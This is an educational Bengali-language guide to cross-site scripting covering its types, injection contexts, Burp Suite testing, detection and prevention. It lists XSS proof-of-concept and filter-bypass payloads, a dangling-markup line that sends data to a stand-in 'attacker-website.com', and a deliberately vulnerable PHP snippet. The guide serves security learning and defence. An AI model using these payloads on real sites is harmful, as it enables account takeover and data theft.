# Cross-site Scripting (XSS)

## 1. What is Cross-site Scripting (XSS)?

**Short Definition:**
Cross-site scripting (XSS) হলো একটি web security vulnerability যা অ্যাটাকারকে একটি অ্যাপ্লিকেশনের সাথে ইউজারদের ইন্টারঅ্যাকশন কম্প্রোমাইজ করার সুযোগ দেয় এবং Same Origin Policy (SOP) বাইপাস করতে সাহায্য করে।

**Detailed Explanation:**
Same Origin Policy (SOP) মূলত বিভিন্ন ওয়েবসাইটকে একে অপরের থেকে আলাদা (segregate) রাখার জন্য ডিজাইন করা হয়েছে। XSS এই পলিসিটি বাইপাস করে। এর মাধ্যমে একজন অ্যাটাকার ভিকটিম ইউজারের ছদ্মবেশ ধারণ (masquerade) করতে পারে। ইউজার যা যা করতে পারে, অ্যাটাকার তার সবকিছুই করতে পারে এবং ইউজারের সব ডেটা অ্যাক্সেস করতে পারে। যদি ভিকটিম ইউজারের কোনো privileged access (যেমন admin) থাকে, তবে অ্যাটাকার পুরো অ্যাপ্লিকেশন এবং এর ডেটার ওপর পূর্ণ নিয়ন্ত্রণ নিয়ে নিতে পারে।

## 2. Why Does It Happen?

XSS তৈরি হওয়ার মূল কারণ হলো unsafe data handling। যখন অ্যাপ্লিকেশন কোনো untrusted সোর্স (যেমন ইউজারের দেওয়া ইনপুট, URL প্যারামিটার বা ডেটাবেস) থেকে ডেটা গ্রহণ করে এবং কোনো ভ্যালিডেশন বা আউটপুট এনকোডিং (encoding) ছাড়াই সরাসরি HTTP রেসপন্সে যুক্ত করে দেয়, তখন ব্রাউজার সেই ডেটাকে সাধারণ টেক্সটের বদলে executable script (JavaScript) হিসেবে প্রসেস করে।

## 3. How It Works

1. User (বা অ্যাটাকার) অ্যাপ্লিকেশনে একটি ইনপুট পাঠায় (যেমন URL প্যারামিটার বা ফর্মের মাধ্যমে)।
2. Application সেই ইনপুটটি গ্রহণ করে এবং কোনো ভ্যালিডেশন বা এনকোডিং ছাড়াই পেজের HTML-এ যুক্ত করে দেয়।
3. Victim যখন ওই পেজটি ভিজিট করে, তখন সার্ভার থেকে রেসপন্সটি ভিকটিমের ব্রাউজারে আসে।
4. Victim-এর ব্রাউজার রেসপন্সটি পার্স করার সময় অ্যাটাকারের দেওয়া ইনপুটটিকে JavaScript কোড হিসেবে বিবেচনা করে এবং এক্সিকিউট করে।
5. Security control (SOP) বাইপাস হয়ে যায় এবং স্ক্রিপ্টটি ভিকটিমের সেশনের কনটেক্সটে রান করে।
6. Attacker ভিকটিমের অ্যাকাউন্ট বা ডেটার অ্যাক্সেস পেয়ে যায়।

## 4. Simple Example

**Reflected XSS Example:**
ধরা যাক, একটি অ্যাপ্লিকেশনের স্ট্যাটাস চেক করার URL নিচের মতো:
`[https://insecure-website.com/status?message=All+is+well](https://insecure-website.com/status?message=All+is+well).`

Application এটি রেসপন্সে নিচের মতো দেখায়:

```html
<p>Status: All is well.</p>

```

**Modified request (Attacker's Payload):**
অ্যাটাকার URL পরিবর্তন করে একটি ক্ষতিকর স্ক্রিপ্ট যুক্ত করে:
`[https://insecure-website.com/status?message=](https://insecure-website.com/status?message=)<script>/*+Bad+stuff+here...+*/</script>`

**Result:**
সার্ভার রেসপন্সে এটি হুবহু বসিয়ে দেয়:

```html
<p>Status: <script>/* Bad stuff here... */</script></p>

```

ভিকটিম যখন এই URL-এ ক্লিক করে, তখন তার ব্রাউজার `<script>` ট্যাগের ভেতরের কোডটি রান করে।

## 5. Technical Example

**Stored XSS Example (Blog Comment):**

অ্যাটাকার একটি ব্লগ পোস্টে নিচের HTTP রিকোয়েস্টের মাধ্যমে কমেন্ট সাবমিট করে:

```http
POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Length: 100

postId=3&comment=%3Cscript%3E%2F*%2BBad%2Bstuff%2Bhere...%2B*%2F%3C%2Fscript%3E&name=Carlos

```

এখানে `comment` প্যারামিটারে `<script>/* Bad stuff here... */</script>` URL-encoded অবস্থায় আছে।

**Explanation:**

1. **Important Part:** `comment` প্যারামিটারটি ডেটাবেসে স্টোর হয়।
2. **Attacker's change:** অ্যাটাকার সাধারণ টেক্সটের বদলে JavaScript পেলোড দিয়েছে।
3. **Server processing:** সার্ভার ডেটাটি সেভ করে রাখে। পরবর্তীতে যখনই কোনো ইউজার ওই ব্লগ পোস্টটি ভিজিট করে, সার্ভার ডেটাবেস থেকে ওই কমেন্টটি বের করে HTML রেসপন্সে দিয়ে দেয়।
4. **Triggering:** ভিকটিমের ব্রাউজার রেসপন্স রিসিভ করে এবং কমেন্টের ভেতরের স্ক্রিপ্টটি ভিকটিমের ব্রাউজারে রান করে।

## 6. Attack Flow

Attacker
↓
Identify an entry point (e.g., URL parameter, input field)
↓
Inject malicious JavaScript payload
↓
Application processes the input unsafely (reflects or stores it)
↓
Victim visits the affected page/URL
↓
Malicious script executes in Victim's browser context
↓
Attacker steals session, performs unauthorized actions, or captures data

## 7. Important Conditions / Requirements

* অ্যাপ্লিকেশনে Untrusted ডেটা রিসিভ করার এন্ট্রি পয়েন্ট থাকতে হবে (URL, Form, Headers)।
* ডেটাটি রেসপন্সে আউটপুট হওয়ার সময় পর্যাপ্ত HTML/JavaScript encoding থাকা যাবে না।
* **Reflected XSS-এর ক্ষেত্রে:** ভিকটিমকে অ্যাটাকারের তৈরি করা লিংকে ক্লিক করতে হবে (external delivery mechanism প্রয়োজন)।
* **Stored XSS-এর ক্ষেত্রে:** ভিকটিমকে শুধু সেই পেজটি ভিজিট করতে হবে যেখানে ডেটাটি স্টোর করা আছে।
* **DOM XSS-এর ক্ষেত্রে:** JavaScript-এর এমন একটি Sink থাকতে হবে যা Source থেকে ডেটা নিয়ে এক্সিকিউট করতে পারে।

## 8. Types / Variations

### A. Reflected XSS

**What is it?** যখন অ্যাপ্লিকেশনের HTTP রিকোয়েস্টের ডেটা তাৎক্ষণিকভাবে (immediate response) কোনো নিরাপদ এনকোডিং ছাড়া রেসপন্সে রিফ্লেক্ট হয়।
**How it works:** অ্যাটাকার একটি লিংক তৈরি করে ভিকটিমকে পাঠায়। ভিকটিম ক্লিক করলে রিকোয়েস্টটি সার্ভারে যায় এবং সার্ভার রেসপন্সে পেলোডটি ফেরত পাঠায়, যা ভিকটিমের ব্রাউজারে রান করে।
**Impact:** এটি স্টোর হয় না বলে অ্যাটাকটি নির্দিষ্ট সময়ের জন্য কাজ করে (যখন ইউজার লিংকে ক্লিক করে)।

### B. Stored XSS (Persistent / Second-order XSS)

**What is it?** যখন অ্যাপ্লিকেশন untrusted সোর্স (যেমন ফর্ম সাবমিট, ইমেইল, নেটওয়ার্ক প্যাকেট) থেকে ডেটা নিয়ে ডেটাবেস বা অন্য কোথাও স্টোর করে এবং পরবর্তীতে অন্য ইউজারদের রেসপন্সে তা এনকোডিং ছাড়াই দেখায়।
**How it works:** অ্যাটাকার একবার পেলোড সাবমিট করে। এরপর যত ইউজার ওই পেজে যাবে, সবার ব্রাউজারে স্ক্রিপ্টটি রান করবে।
**Important difference:** Reflected XSS-এর মতো ভিকটিমকে লিংকে ক্লিক করানোর প্রয়োজন নেই (self-contained attack)। ইউজার পেজ ভিজিট করলেই অ্যাটাক হবে। এটি নিশ্চিত করে যে ভিকটিম লগ-ইন অবস্থায় আছে।

### C. DOM-based XSS (DOM XSS)

**What is it?** এই ভালনারেবিলিটি সার্ভার-সাইডের বদলে ক্লায়েন্ট-সাইড কোডে (JavaScript) থাকে।
**How it works:** যখন পেজের JavaScript কোনো untrusted `source` (যেমন `location.search` বা `location.hash`) থেকে ডেটা নিয়ে কোনো বিপজ্জনক `sink` (যেমন `eval()` বা `innerHTML`)-এ পাঠায়, তখন এটি ঘটে। এখানে পেলোড সার্ভারে যাওয়ার আগেই ব্রাউজারের DOM-এ এক্সিকিউট হতে পারে।

### D. Self-XSS

**What is it?** এটি Reflected XSS-এর মতোই, কিন্তু এটি কোনো crafted URL দিয়ে ট্রিগার করা যায় না।
**How it works:** ভিকটিমকে সোশ্যাল ইঞ্জিনিয়ারিং করে নিজের ব্রাউজারে নিজে থেকেই পেলোড পেস্ট করাতে হয়।
**Impact:** এটি সাধারণত লো-ইমপ্যাক্ট বা লেইম (lame) হিসেবে বিবেচনা করা হয়।

## 9. Different Contexts

XSS পেলোড কোথায় রিফ্লেক্ট হচ্ছে, তার ওপর ভিত্তি করে এক্সপ্লয়টেশন পদ্ধতি ভিন্ন হয়:

* **Between HTML tags:** `<div>[Controllable Data]</div>`। এখানে `<script>` বা `<img onerror...>` ট্যাগ ব্যবহার করা যায়।
* **In HTML tag attributes:** `<input value="[Controllable Data]">`। এখানে অ্যাট্রিবিউট থেকে বের হওয়ার জন্য `">` বা ইভেন্ট হ্যান্ডলার (যেমন `onfocus=alert(1)`) ব্যবহার করতে হয়।
* **Into JavaScript:** `<script>var x = '[Controllable Data]';</script>`। এখানে স্ট্রিং থেকে বের হতে `'-alert(1)-'` বা স্ক্রিপ্ট ট্যাগ ক্লোজ করতে `</script>` লাগে।
* **JavaScript Template Literals:** `var msg = `Welcome ${[Controllable Data]}`;`। এখানে `${alert(1)}` ব্যবহার করেই কোড রান করা যায়।
* **Client-side Template Injection:** AngularJS-এর মতো ফ্রেমওয়ার্কে ডাবল কার্লি ব্রেস `{{}}` ব্যবহার করে টেমপ্লেট এক্সপ্রেশন ইনজেক্ট করা হয়।

## 10. Exploitation / Practical Understanding

**1. Stealing Cookies:**
অ্যাটাকার `document.cookie` ব্যবহার করে ভিকটিমের সেশন কুকি চুরি করতে পারে এবং নিজের সার্ভারে পাঠাতে পারে।
*Limitations:* ভিকটিম লগ-ইন না থাকলে কাজ করবে না। কুকিতে `HttpOnly` ফ্ল্যাগ থাকলে JavaScript দিয়ে কুকি পড়া যায় না। সেশন IP লকড বা টাইমআউট থাকতে পারে।

**2. Capturing Passwords:**
Password manager-গুলো সাধারণত অটো-ফিল (auto-fill) করে। অ্যাটাকার একটি ফেক পাসওয়ার্ড ইনপুট ফিল্ড তৈরি করে অটো-ফিল হওয়া পাসওয়ার্ডটি পড়ে নিজের ডোমেইনে পাঠিয়ে দিতে পারে। এটি কুকি চুরির লিমিটেশনগুলো এড়াতে সাহায্য করে।

**3. Bypassing CSRF Protections:**
CSRF টোকেন XSS-এর বিরুদ্ধে কাজ করে না। কারণ XSS-এর মাধ্যমে অ্যাটাকার পেজ রিকোয়েস্ট করে রেসপন্স থেকে CSRF টোকেনটি সরাসরি পড়ে নিতে পারে (two-way communication)। এরপর সেই টোকেন ব্যবহার করে ভিকটিমের ইমেইল বা পাসওয়ার্ড পরিবর্তন করে অ্যাকাউন্ট টেকওভার করতে পারে।

## 11. Step-by-Step Exploitation

**Finding Reflected XSS:**

* **Step 1 — Test every entry point:** URL প্যারামিটার, ফাইল পাথ, বডি ডেটা এবং হেডার চেক করুন।
* **Step 2 — Submit random alphanumeric values:** একটি ছোট র্যান্ডম স্ট্রিং (যেমন ৮ ক্যারেক্টারের অ্যালফানিউমেরিক) সাবমিট করুন যা সহজে ইনপুট ভ্যালিডেশনে আটকাবে না।
* **Step 3 — Determine the reflection context:** রেসপন্সে খুঁজুন ওই র্যান্ডম ভ্যালুটি কোথায় রিফ্লেক্ট হয়েছে (HTML ট্যাগের মাঝে, অ্যাট্রিবিউটে নাকি JS-এ)।
* **Step 4 — Test a candidate payload:** কনটেক্সট অনুযায়ী Burp Repeater-এ একটি পেলোড ইনজেক্ট করে রেসপন্স চেক করুন যে তা মডিফাই ছাড়া বসেছে কি না। অরিজিনাল র্যান্ডম ভ্যালু রেখে তার আগে/পরে পেলোড বসালে সহজে সার্চ করা যায়।
* **Step 5 — Test alternative payloads:** যদি WAF বা ফিল্টার থাকে, তবে এনকোডিং বা বিকল্প পেলোড ট্রাই করুন।
* **Step 6 — Verify the result:** ব্রাউজারে URL-টি ওপেন করে নিশ্চিত হোন যে পপআপ বা কোড এক্সিকিউট হচ্ছে (যেমন `alert(document.domain)`)।

**Finding Stored XSS:**
এখানে Entry point (যেখানে ডেটা ইনপুট হয়) এবং Exit point (যেখানে ডেটা রেসপন্সে আসে) লিংক করতে হয়। র্যান্ডম ভ্যালু ইনপুট দিয়ে দেখতে হয় অন্য কোনো পেজে তা স্টোর হয়ে রেসপন্সে আসছে কি না।

## 12. HTTP Requests / Responses

**Reflected DOM XSS Example:**

```http
GET /search?query="><script>alert(1)</script> HTTP/1.1
Host: vulnerable-website.com

```

**Response:**

```http
HTTP/1.1 200 OK
Content-Type: text/html

<script>
    var data = "\"><script>alert(1)</script>"; // Reflected string
    eval(data); // Unsafe sink processes the reflected data
</script>

```

*Explanation:* সার্ভার রিকোয়েস্ট থেকে ডেটা নিয়ে রেসপন্সে বসিয়েছে (Reflected), এবং পেজের একটি ক্লায়েন্ট-সাইড স্ক্রিপ্ট সেই ডেটা `eval` সিঙ্কে প্রসেস করেছে, যা DOM XSS তৈরি করেছে।

## 13. Payloads

* **Classic PoC (For older browsers/non-iframes):** `<script>alert(document.domain)</script>`
* *Purpose:* ব্রাউজারে ডোমেইন নাম পপআপ করে দেখানো।


* **Chrome 92+ PoC (Cross-origin iframes):** `<script>print()</script>`
* *Purpose:* Chrome 92 থেকে cross-domain iframe-এ `alert()`, `prompt()`, `confirm()` ব্লক করা হয়েছে। তাই XSS প্রমাণ করতে `print()` ফাংশন ব্যবহার করা হয় যা প্রিন্ট ডায়ালগ ওপেন করে।


* **Without `<script>` tag:** `<img src=1 onerror=alert(1)>`
* *Purpose:* যখন `<script>` ট্যাগ ব্লক থাকে। ইমেজ সোর্স ভুল থাকায় `onerror` ইভেন্ট ট্রিগার হয়ে কোড রান করে।


* **Breaking out of attributes:** `" autofocus onfocus=alert(document.domain) x="`
* *Purpose:* HTML অ্যাট্রিবিউট থেকে বের হয়ে নতুন ইভেন্ট হ্যান্ডলার যুক্ত করা এবং অটো-ট্রিগার করানো।


* **JavaScript Pseudo-protocol:** `<a href="javascript:alert(1)">`
* *Purpose:* Anchor (`<a>`) ট্যাগের `href` অ্যাট্রিবিউটে XSS এক্সিকিউট করা।


* **Terminating existing script:** `</script><img src=1 onerror=alert(document.domain)>`
* *Purpose:* অরিজিনাল স্ক্রিপ্ট ব্রেক করে এইচটিএমএল পার্সার দিয়ে নতুন স্ক্রিপ্ট রান করানো।


* **Breaking out of JS Strings:** `'-alert(document.domain)-'` বা `\';alert(document.domain)//`
* *Purpose:* কোটেশন মার্ক ব্রেক করে কোড এক্সিকিউট করা এবং পেছনের অরিজিনাল কোড কমেন্ট আউট করা।


* **Bypassing parentheses restrictions:** `onerror=alert;throw 1`
* *Purpose:* ব্রাউজার যদি `()` ব্লক করে, তবে `throw` স্টেটমেন্ট দিয়ে এক্সেপশন হ্যান্ডলারের মাধ্যমে ফাংশন কল করা।


* **HTML-encoding in attributes:** `&apos;-alert(document.domain)-&apos;`
* *Purpose:* ফিল্টার বাইপাস করা। ব্রাউজার ইভেন্ট হ্যান্ডলারের (যেমন `onclick`) HTML entity ডিকোড করে, ফলে XSS সফল হয়।


* **Template literal:** `${alert(document.domain)}`
* *Purpose:* ব্যাকটিক-এর (```) ভেতরে এক্সপ্রেশন ইভ্যালুয়েট করা।


* **Dangling Markup:** `"><img src='//attacker-website.com?`
* *Purpose:* ফুল XSS ব্লক থাকলে আনক্লোজড ট্যাগ দিয়ে রেসপন্সের ডেটা (যেমন CSRF টোকেন) চুরি করা।



## 14. Burp Suite Workflow

* **Burp Scanner:** স্বয়ংক্রিয়ভাবে রিফ্লেক্টেড, স্টোরড এবং DOM XSS (Static + Dynamic JS analysis) স্ক্যান করতে পারে।
* **Burp Intruder:** র্যান্ডম হেক্স ভ্যালু (Number payloads) জেনারেট করে এন্ট্রি পয়েন্টে পাঠানো এবং 'Grep payloads' অপশন দিয়ে রেসপন্সে তা রিফ্লেক্ট হচ্ছে কি না তা দ্রুত খুঁজে বের করা।
* **Burp Repeater:** ম্যানুয়ালি কনটেক্সট যাচাই করা এবং ক্যান্ডিডেট পেলোড টেস্ট করা।
* **DOM Invader:** এটি Burp-এর বিল্ট-ইন ব্রাউজারের একটি এক্সটেনশন (DevTools-এ থাকে)। এটি স্বয়ংক্রিয়ভাবে DOM XSS-এর source এবং sink আইডেন্টিফাই করে, `postMessage()` ওয়েব মেসেজ ইন্টারসেপ্ট ও মডিফাই করে এবং Client-side prototype pollution ও DOM clobbering ডিটেক্ট করতে সাহায্য করে।

## 15. How to Identify / Detect

* **Reflected/Stored:** র্যান্ডম অ্যালফানিউমেরিক ভ্যালু (e.g., `xyz123`) ইনপুট দিয়ে রেসপন্সে কোথায় রিফ্লেক্ট হয়েছে তা খুঁজে বের করা।
* **DOM XSS (HTML Sinks):** Chrome DevTools-এ সোর্স (যেমন `location.search`) চেক করা এবং DOM-এ আপনার দেওয়া র্যান্ডম স্ট্রিং খুঁজুন (Control+F)। "View source" ব্যবহার করা যাবে না কারণ এটি JS-এর মডিফিকেশন দেখায় না।
* **DOM XSS (JS Execution Sinks):** DevTools-এ Control+Shift+F দিয়ে পেজের JS কোডে সোর্স খুঁজুন। এরপর JavaScript debugger দিয়ে ব্রেকপয়েন্ট (break point) বসিয়ে ট্র্যাক করুন যে ভ্যালুটি কোনো সিঙ্ক (যেমন `eval`) পর্যন্ত যাচ্ছে কি না।

## 16. Common Mistakes

* **Testing with `alert()` in modern Chrome iframes:** Chrome 92-এর পর cross-domain iframe-এ `alert()` কাজ করে না। বিগিনাররা পেলোড ঠিক থাকলেও `alert()` না আসায় মনে করে XSS নেই। এক্ষেত্রে `print()` ব্যবহার করতে হবে।
* **Viewing Source for DOM XSS:** ব্রাউজারের "View source" অপশন DOM XSS খুঁজতে কাজ করে না, কারণ এটি JavaScript-এর করা DOM পরিবর্তন দেখায় না। DevTools-এর 'Elements' ট্যাব ব্যবহার করতে হবে।
* **Blacklisting tags:** `javascript`, `data` প্রোটোকল বা নির্দিষ্ট ট্যাগ ব্ল্যাকলিস্ট করা ভুল অ্যাপ্রোচ, কারণ অ্যাটাকাররা নতুন প্রোটোকল বা ওবফাসকেশন (obfuscation) দিয়ে তা বাইপাস করতে পারে। Whitelisting ব্যবহার করা উচিত।
* **Failing to escape the backslash:** অ্যাপ্লিকেশনগুলো অনেক সময় `'` কে `\'` করে দেয়, কিন্তু `\` কে এস্কেপ করতে ভুলে যায়। ফলে অ্যাটাকার `\\'` ব্যবহার করে এস্কেপিং নিউট্রালাইজ করতে পারে।

## 17. Limitations

* **Stealing Cookies:** `HttpOnly` ফ্ল্যাগ থাকলে কুকি চুরি করা যায় না।
* **Password Capture:** ইউজার পাসওয়ার্ড সেভ না করে রাখলে বা পাসওয়ার্ড ম্যানেজার অটো-ফিল না করলে কাজ করবে না।
* **Dangling Markup:** Chrome এখন `<img>` ট্যাগের URL-এ raw angle brackets (`<`, `>`) এবং newlines ব্লক করে, যা অনেক Dangling Markup অ্যাটাক আটকে দেয়।
* **Reflected XSS:** ভিকটিমকে লগ-ইন অবস্থায় থাকতে হবে এবং লিংকে ক্লিক করতে হবে।

## 18. Edge Cases / Important Details

* **Access Keys:** Canonical ট্যাগ বা যেখানে সাধারণত ইভেন্ট ফায়ার হয় না, সেখানে `accesskey` অ্যাট্রিবিউট ব্যবহার করে কীবোর্ড শর্টকাটের মাধ্যমে ইভেন্ট ট্রিগার করানো যায়।
* **Browser parsing order:** `</script>` দিয়ে অরিজিনাল স্ক্রিপ্ট ব্রেক করলে ব্রাউজারে সিনট্যাক্স এরর আসে, কিন্তু ব্রাউজারের HTML পার্সার আগেই নতুন ইনজেক্ট করা এইচটিএমএল পেলোড এক্সিকিউট করে ফেলে।
* **CSP Policy Injection:** যদি অ্যাপ্লিকেশন `report-uri` ডিরেক্টিভে ইনপুট রিফ্লেক্ট করে, তবে সেমিকোলন (`;`) ইনজেক্ট করে নিজস্ব CSP ডিরেক্টিভ যোগ করা যায়। Chrome-এর `script-src-elem` ডিরেক্টিভ ব্যবহার করে বিদ্যমান `script-src` ওভাররাইট করা যায়।

## 19. Database / Platform / Technology Differences

| Technology | Important Difference |
| --- | --- |
| **Chrome / Firefox / Safari** | `location.search` এবং `location.hash` স্বয়ংক্রিয়ভাবে URL-encode করে। Chrome 92+ cross-origin iframe-এ `alert()` ব্লক করে। |
| **IE11 / pre-Chromium Edge** | `location.search` এবং `location.hash` URL-encode করে না, যা DOM XSS-কে সহজ করে দেয়। |
| **jQuery** | `attr()` এবং `$()` (selector) সিঙ্ক হিসেবে কাজ করতে পারে। `$(location.hash)` দিয়ে ক্লাসিক DOM XSS হতো। লেটেস্ট jQuery `#` দিয়ে শুরু হওয়া ইনপুটে HTML রেন্ডার করা বন্ধ করেছে। |
| **AngularJS** | `ng-app` থাকলে `{{ }}` (double curly braces) এর ভেতরে সরাসরি JavaScript এক্সিকিউট করা যায় (Client-side template injection), কোনো অ্যাঙ্গেল ব্র্যাকেট ছাড়াই। |
| **PHP** | HTML এনকোডিং-এর জন্য `htmlentities($input, ENT_QUOTES, 'UTF-8')` আছে। কিন্তু JS স্ট্রিং-এ Unicode-escape করার কোনো বিল্ট-ইন API নেই, কাস্টম কোড লিখতে হয়। |
| **Twig / Jinja / React** | Twig-এ `e('html')` ব্যবহার করা হয়। Jinja এবং React ডিফল্টভাবেই কন্টেন্ট এস্কেপ করে দেয়। |

## 20. Impact

XSS সফল হলে অ্যাটাকার পারে:

* ইউজারের সেশন হাইজ্যাক করে অ্যাকাউন্টের ফুল কন্ট্রোল নেওয়া (Account takeover)।
* ইউজারের পক্ষে আনঅথোরাইজড কাজ করা (CSRF bypass)।
* সেনসিটিভ ডেটা, ইমেইল বা ট্রানজেকশন হিস্ট্রি পড়া।
* ইউজারের পাসওয়ার্ড ক্যাপচার করা।
* ওয়েবসাইট ভার্চুয়ালি ডিফেস (Virtual defacement) করা বা ট্রোজান ফাংশনালিটি ইনজেক্ট করা।
* (যদি ভিকটিম অ্যাডমিন হয়) সার্ভার বা অ্যাপ্লিকেশনের সম্পূর্ণ নিয়ন্ত্রণ নেওয়া।

## 21. Prevention / Mitigation

XSS প্রতিরোধের মূল ধারণা হলো ডেটাকে কোড হিসেবে এক্সিকিউট হতে না দেওয়া।

* **Encode data on output:** ডেটা আউটপুট করার ঠিক আগে কনটেক্সট অনুযায়ী এনকোড করা।
* HTML কনটেক্সটে: `<` কে `&lt;` এবং `>` কে `&gt;` করা। (PHP-তে `htmlentities` ব্যবহার করা)।
* JavaScript কনটেক্সটে: Non-alphanumeric ক্যারেক্টারকে Unicode-escape করা (যেমন `<` কে `\u003c`)।


* **Filter input on arrival (Validation):** ইনপুট গ্রহণ করার সময় স্ট্রিক্ট ভ্যালিডেশন করা। ব্ল্যাকলিস্ট (Blacklist)-এর বদলে সব সময় হোয়াইটলিস্ট (Whitelist) ব্যবহার করা।
* **Response Headers:** `Content-Type` এবং `X-Content-Type-Options` ব্যবহার করে ব্রাউজারকে সঠিক কন্টেন্ট টাইপ বুঝিয়ে দেওয়া।
* **Allowing "safe" HTML:** যদি ইউজারকে HTML দিতেই হয়, তবে DOMPurify-এর মতো ব্রাউজার-বেসড স্যানিটাইজার ব্যবহার করা।
* **Content Security Policy (CSP):** `Content-Security-Policy` হেডার ব্যবহার করা। যেমন `script-src 'self'` শুধু নির্দিষ্ট ডোমেইন থেকে স্ক্রিপ্ট রান হতে দেয়। `nonce` (random value) বা `hash` ব্যবহার করে এক্সিকিউশন আরও রেস্ট্রিক্ট করা যায়। `img-src 'self'` ব্যবহার করে Dangling markup অ্যাটাক মিটিগেট করা যায়।

## 22. Vulnerable vs Secure Example

**Vulnerable PHP Code:**

```php
<script>x = '<?php echo $_GET['x']; ?>';</script>

```

*Why vulnerable?* ইনপুট সরাসরি JS স্ট্রিং-এ বসেছে। ইউজার `';alert(1)//` দিলে তা এক্সিকিউট হবে।

**Secure PHP Code:**

```php
<script>x = '<?php echo jsEscape($_GET['x']); ?>';</script>

```

*Why secure?* এখানে কাস্টম `jsEscape` ফাংশন ব্যবহার করে ইনপুটকে Unicode-escape করা হয়েছে, ফলে কোটেশন মার্ক বা অন্যান্য ক্যারেক্টার আর কোড ব্রেক করতে পারবে না।

## 23. Real Understanding

XSS মূলত ব্রাউজারের কনফিউশনের কারণে ঘটে। ব্রাউজার বুঝতে পারে না কোনটি সার্ভারের লেখা আসল কোড আর কোনটি ইউজারের দেওয়া ইনপুট ডেটা। অ্যাপ্লিকেশন যখন ইনপুট ডেটাকে কোনো প্রটেকশন (এনকোডিং) ছাড়াই রেসপন্সে বসিয়ে দেয়, তখন ব্রাউজার সেই ডেটাকেই এক্সিকিউটেবল কোড হিসেবে ট্রিট করে। DOM XSS-এর ক্ষেত্রে এটি ব্রাউজারের ভেতরেই ঘটে (source থেকে sink-এ গিয়ে), সার্ভারের কোনো সরাসরি ভূমিকা থাকে না। XSS অ্যাটাকের মূল লক্ষ্য সার্ভার নয়, বরং ওই অ্যাপ্লিকেশন ব্যবহারকারী অন্যান্য ইউজাররা।

## 24. Mental Model

Attacker injects payload → Server reflects/stores it UNSAFELY
↓
Victim visits the page
↓
Browser parses the response
↓
Browser fails to distinguish between data and executable script
↓
Malicious script executes in Victim's browser context (SOP bypassed)
↓
Attacker controls user interaction & steals data

## 25. Quick Revision

* **Definition:** অ্যাটাকার যখন ইউজারের ব্রাউজারে ক্ষতিকর স্ক্রিপ্ট রান করায়।
* **Cause:** Unsafe input validation এবং output encoding-এর অভাব।
* **Main idea:** ডেটাকে স্ক্রিপ্ট হিসেবে এক্সিকিউট করানো।
* **Attack flow:** Source (Input) -> Untrusted Data -> Rendered in Response without encoding -> Browser executes.
* **Important condition:** ব্রাউজারকে অবশ্যই ডেটাটি পার্স করতে হবে।
* **Main techniques:** Reflected (Immediate), Stored (Database), DOM (Client-side JS sinks).
* **Detection:** র্যান্ডম অ্যালফানিউমেরিক ভ্যালু দিয়ে রিফ্লেকশন চেক করা, DOM Invader ব্যবহার করা।
* **Impact:** Cookie theft, Password capture, CSRF bypass, Account takeover.
* **Prevention:** Context-aware Output Encoding (HTML/Unicode), Whitelisting, CSP.

## 26. Things to Remember

* **Chrome 92+ cross-origin iframes-এ `alert()` কাজ করে না, `print()` ব্যবহার করতে হবে।**
* Reflected XSS-এ ভিকটিমকে লিংকে ক্লিক করতে হয়, কিন্তু Stored XSS-এ ভিকটিম পেজ ভিজিট করলেই অ্যাটাক হয় (Self-contained)।
* DOM XSS-এর জন্য `location.search` (source) এবং `innerHTML`, `eval()` (sinks) খুব পরিচিত।
* Dangling markup injection তখন কাজে লাগে যখন সাধারণ XSS ফিল্টারে আটকে যায়, এটি রেসপন্সের ডেটা (যেমন CSRF টোকেন) চুরি করতে ব্যবহৃত হয়।
* CSRF টোকেন XSS আটকাতে পারে না, উল্টো XSS দিয়ে CSRF ডিফেন্স বাইপাস করা যায় (Two-way communication)।
* "View source" দিয়ে DOM XSS দেখা যায় না, DevTools-এর Inspector ব্যবহার করতে হয়।

